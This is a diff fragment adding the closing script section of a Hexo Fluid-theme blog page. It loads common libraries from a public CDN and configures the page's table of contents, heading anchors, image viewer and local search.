+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
